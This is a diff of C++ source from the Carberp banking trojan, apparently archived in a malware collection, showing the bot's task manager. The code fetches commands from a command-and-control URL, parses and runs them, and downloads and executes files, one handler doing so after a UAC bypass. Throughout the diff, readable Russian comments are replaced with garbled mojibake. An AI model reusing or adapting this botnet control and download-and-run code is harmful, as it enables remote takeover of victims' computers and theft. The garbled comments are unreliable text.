@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <windows.h>
 
@@ -31,7 +42,7 @@
 #include "BotMonitorMsg.h"
 
 //---------------------------------------------------------------------------
-// Система вывода отладочной информации
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 #include "BotDebug.h"
 
@@ -47,14 +58,14 @@ namespace TASKDBGTEMPLATES
 
 typedef struct TTaskManager
 {
-	PCHAR URL;                  // Адрес откуда будут браться команды
-	DWORD Interval;             // Интервал получения команд (ьиллисекунд);
-	LPCRITICAL_SECTION Lock;    // Секция блокирования
-	PList RegisteredCommands;   // Список зарегистрированных команд
-	HANDLE CommandsThread;      // Поток отложенного выполнения команд
-	HANDLE CommandEvent;        // Собитие добавления новой команды в список
-	PList CommandsList;         // Список команд ожидающий выполнения
-	bool Terminated;            // Признак прерванной работы
+	PCHAR URL;                  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD Interval;             // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ);
+	LPCRITICAL_SECTION Lock;    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	PList RegisteredCommands;   // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	HANDLE CommandsThread;      // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	HANDLE CommandEvent;        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	PList CommandsList;         // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	bool Terminated;            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 } *PTASKMANAGER;
 
@@ -72,7 +83,7 @@ typedef struct TCommand
 } *PCommand;
 
 
-// Глобальный енеджер задач
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //HANDLE GLManagerPID = NULL;
 PTaskManager GlobalTaskManager = NULL;
 DWORD TaslManagerProcess = 0;
@@ -80,7 +91,7 @@ DWORD TaslManagerProcess = 0;
 //---------------------------------------------------------------------------
 PTaskManager GetGlobalTaskManager(bool Initialize)
 {
-	// Возвращаем указатель на глобальный менеджер задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (IsNewProcess(TaslManagerProcess))
 		GlobalTaskManager = NULL;
 
@@ -110,7 +121,7 @@ void FreeRegisteredCommand(LPVOID C)
 
 bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
 {
-	// Создать менеджер команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (IsNewProcess(TaslManagerProcess))
 		GlobalTaskManager = NULL;
 
@@ -136,7 +147,7 @@ bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
 
 void FreeTaskManager(PTaskManager Manager)
 {
-	// Уничтожаем менеджер задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M;
 	if (Manager != NULL)
 		M = (PTASKMANAGER)Manager;
@@ -158,7 +169,7 @@ void FreeTaskManager(PTaskManager Manager)
 //----------------------------------------------------------------------------
 PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
 {
-	// Ищем команду по имени
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     PRegisteredCommand C;
 	DWORD Count = List::Count(M->RegisteredCommands);
 	for (DWORD i = 0; i < Count; i++)
@@ -185,7 +196,7 @@ bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Met
 		return false;
 
 
-	// Создаём описание команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pEnterCriticalSection(M->Lock);
 
 	if (M->RegisteredCommands == NULL)
@@ -210,27 +221,27 @@ bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Met
 
 DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
 {
-	// Процедура потока выполнения комманд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M = (PTASKMANAGER)Data;
 	PCommand Command;
 	do
 	{
-		// Ожидаем события
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pWaitForSingleObject(M->CommandEvent, INFINITE);
 
 		if (!M->Terminated)
 		{
-            // Получаем следующую команду
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pEnterCriticalSection(M->Lock);
 
 			Command = (PCommand)List::Extract(M->CommandsList, 0);
-			// В случае если список пустой сбрасываем событие
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (List::Count(M->CommandsList) == 0)
 				pResetEvent(M->CommandEvent);
 
 			pLeaveCriticalSection(M->Lock);
 
-			// Выполняем команду
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			ExecuteCommand(NULL, Command->Command, Command->Args, false);
 
 			FreeCommand(Command);
@@ -245,7 +256,7 @@ DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
 
 void CreateTaskThread(PTASKMANAGER M)
 {
-	// Создать необходимые данные для отложенного выполнения команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (M->CommandsThread != NULL)
 		return;
 	M->CommandsList = List::Create();
@@ -257,7 +268,7 @@ void CreateTaskThread(PTASKMANAGER M)
 
 bool TaskManagerSleep(PTaskManager Manager)
 {
-	// Заснуть на необходимыи интервал
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PTASKMANAGER M = NULL;
 	if (Manager != NULL)
@@ -267,7 +278,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 	if (M == NULL || M->Terminated)
 		return false;
 
-	// Определяем интервал
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Interval = M->Interval;
 
 	if (Interval == 0)
@@ -277,7 +288,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 		Interval = 60*1000;
 
 
-	// Спим
+	// пїЅпїЅпїЅпїЅ
 	DWORD SleepTime = 0;
 	while (SleepTime < Interval && !M->Terminated)
 	{
@@ -292,9 +303,9 @@ bool TaskManagerSleep(PTaskManager Manager)
 
 //bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
 //{
-//	/*   Запускаем цикл обработки команд  */
+//	/*   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ  */
 //
-//	// Инициализируем менеджер выполнения команд
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //	PTASKMANAGER M;
 //	if (Manager != NULL)
 //		M = (PTASKMANAGER)Manager;
@@ -302,26 +313,26 @@ bool TaskManagerSleep(PTaskManager Manager)
 //		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 //
 //
-//	// Регистрируем известные команды
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //	if (InitCommands)
 //		RegisterAllCommands(M, COMMAND_ALL);
 //
 //	PCHAR RealURL = URL;
 //	bool SelfURL = URL == NULL;
 //
-//	// Запускаем цикл обработки
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //	do
 //	{
 //		if (SelfURL)
 //			RealURL = GetBotScriptURL(SCRIPT_TASK);
 //
-//		// Загружаем и выполняем команду
+//		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //		if (RealURL != NULL)
 //			DownloadAndExecuteCommand(M, RealURL);
 //
 //		if (SelfURL)
 //			STR::Free(RealURL);
-//		// Спим до выполнения следующей команды
+//		// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //		if (!M->Terminated)
 //	        TaskManagerSleep(M);
 //
@@ -335,7 +346,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 
 void StopTaskManager(PTaskManager Manager)
 {
-	// Прервать работу менеджера задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Manager == NULL)
 		Manager = GetGlobalTaskManager(false);
 	if (Manager == NULL) return;
@@ -345,7 +356,7 @@ void StopTaskManager(PTaskManager Manager)
 
 	if (M->CommandsThread)
 	{
-		// Поток работает, останавливаеь
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		M->Terminated = true;
 		pSetEvent(M->CommandEvent);
 		pWaitForSingleObject(M->CommandsThread, 1000);
@@ -366,7 +377,7 @@ void StopTaskManager(PTaskManager Manager)
 /*
 bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 {
-	// Загрузить команду/ набор команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ/ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool GenerateURL = STR::IsEmpty(URL);
 
 	if (GenerateURL)
@@ -374,7 +385,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 
 	string BotID = GenerateBotID2(GetPrefix(true).t_str());
 
-	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
+	TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
 
 	PStrings Fields = Strings::Create();
 
@@ -402,12 +413,12 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 				STR::Free(*HTMLCode);
 				*HTMLCode = NULL;
             }
-			TASKDBG("Task", "Для бота отсутствуют команды");
+			TASKDBG("Task", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
 		}
 	}
 	else
-		TASKDBG("Task", "Ошибка загрузки команд. Сервер недоступен");
+		TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
     HTTPResponse::Clear(&Response);
 	Strings::Free(Fields);
@@ -424,7 +435,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 
 bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 {
-	// Загрузить команду/ набор команд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ/ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool GenerateURL = STR::IsEmpty(URL);
 
 	if (GenerateURL)
@@ -432,7 +443,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 
 	string BotID = GenerateBotID2(GetPrefix(true).t_str());
 
-	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
+	TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
 
 
 	TBotStrings Fields;
@@ -447,20 +458,20 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 		THTTP HTTP;
 	#endif
 
-	// Загружаем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	string Cmd;
 	bool Result = HTTP.Post(URL, &Fields, Cmd);
 
 	if (Result && !Cmd.IsEmpty())
 	{
-		// Для совместимости
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (HTMLCode)
 			*HTMLCode = STR::New(Cmd.t_str());
 	}
 	else
 	{
-		TASKDBG("Task", "Для бота отсутствуют команды");
+		TASKDBG("Task", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
 	}
 
@@ -476,7 +487,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 
 bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 {
-	// Загрузить и выполнить команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PTASKMANAGER M;
 	if (Manager != NULL)
@@ -485,7 +496,7 @@ bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 
 
-	// Загружаем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Command = NULL;
 	bool Result = false;
 
@@ -504,12 +515,12 @@ bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 
 void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
 {
-	// событие уведомления об исполнении команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 /* 	PCHAR  prefix;
 	if (Executed)
-		prefix = "выполнено";
+		prefix = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 	else
-		prefix = "не выполнено";
+		prefix = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ";
 
     DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);*/
 }
@@ -527,7 +538,7 @@ bool InvalidChar(char c)
 
 bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 {
-	// Рапарсивает HTML строку на команду и аргументы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (HTML == NULL)
 		return false;
 
@@ -537,7 +548,7 @@ bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 	{
 		Command = STR::GetLeftStr(HTML, " ");
 		bool Changed = false;
-		// Обрезаем лишние символы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Len = STR::Length(Args);
 		PCHAR Tmp = Args + (Len - 1);
 		while (Tmp != Args && InvalidChar(*Tmp))
@@ -562,7 +573,7 @@ bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
 bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 {
 
-	// Раcпарсить HTML и выполнить команду
+	// пїЅпїЅcпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(HTML))
 		return false;
 
@@ -579,7 +590,7 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 	{
 		Line = Strings::GetItem(S, i, false);
 		//
-		//  команды начинающиеся с символа ; игнорируются
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ; пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		//
 		if (!STR::IsEmpty(Line) && *Line != ';')
 		{
@@ -587,13 +598,13 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 
 			if (!STR::IsEmpty(Command))
 			{
-				TASKDBG("Task", "Выполняем команду: %s", Line);
+				TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s", Line);
 
 				bool Executed = ExecuteCommand(Manager, Command, Args, Deferred);
 				if (Executed)
 				{
                     MONITOR_MSG(BMCONST(TaskExecCommandOk), Line);
-                	TASKDBG("Task", "Команда успешно выполнена");
+                	TASKDBG("Task", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 					Res = true;
 				}
 				else
@@ -613,17 +624,17 @@ bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
 
 bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Добавить команду в список отложенного выполнения менеджера задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PTASKMANAGER M =(PTASKMANAGER)Manager;
 	if (M == NULL || Command == NULL)
 		return false;
 
 	pEnterCriticalSection(M->Lock);
 
-	// Запускаем поток
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	CreateTaskThread(M);
 
-	// Создаём комаенду и добавляем её в список
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCommand C = CreateStruct(TCommand);
 	C->Command = STR::New(Command);
 	C->Args = STR::New(Args);
@@ -651,9 +662,9 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 		);
 
 
-	// Выполнить команду Command с аргументами Args
-	// В случае если Deferred == true выполнение команды будет передано
-	// В поток выполнения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Command пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Args
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Deferred == true пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Command == NULL)
 		return false;
 
@@ -664,25 +675,25 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 		M = (PTASKMANAGER)GetGlobalTaskManager(true);
 
 
-	// Определяем метод команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TCommandMethod Method = GetCommandMethod(M, Command);
 
 	TASKDBG("Task", "ExecuteCommand: GetCommandMethod return 0x%X", Method);
 	if (Method == NULL)
 		return false;
 
-    // Добавляем команду в список отложенных команд
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Deferred && M != NULL)
 	{
-		// Отправляем на отложенное выполнение
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ExecuteDeferredCommand(M, Command, Args);
 		return true;
     }
 
-	// Выполняем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
    	bool Result = Method(M, Command, Args);
 
-	// Вызываем событие выполнения команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DoAfterExecuteCommand(M, Command, Args, Result);
 
 
@@ -692,11 +703,11 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 //---------------------------------------------------------------------------
 
 
-//--------------------------  Обработчики команд -------------------------//
+//--------------------------  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ -------------------------//
 
 bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Загрузить и выполнить файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	if (Args == NULL)
 		return false;
@@ -714,7 +725,7 @@ bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return false;
 }
 
-//загрузить и выполнить файл после обхода UAC
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ UAC
 bool ExecuteDownload2(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 #ifdef UAC_bypassH
@@ -729,7 +740,7 @@ bool ExecuteDownload2(PTaskManager Manager, PCHAR Command, PCHAR Args)
 
 bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	// Загрузить конфигурационный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	#ifdef BotConfigH
 		return Config::Download(Args);
 	#else
@@ -740,7 +751,7 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 
 DWORD WINAPI DoExecuteUpdate(string *ArgsPtr)
 {
-	// Загрузить обновление
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string Args(*ArgsPtr);
 	delete ArgsPtr;
 	bool DeleteSettings = Args.Hash(0, true)  == 0x18766C /* all */;
@@ -751,7 +762,7 @@ DWORD WINAPI DoExecuteUpdate(string *ArgsPtr)
 		string FileName = File::GetTempName2A();
 		if (FileName.IsEmpty()) return 0;
 
-		// Загружаем обновление
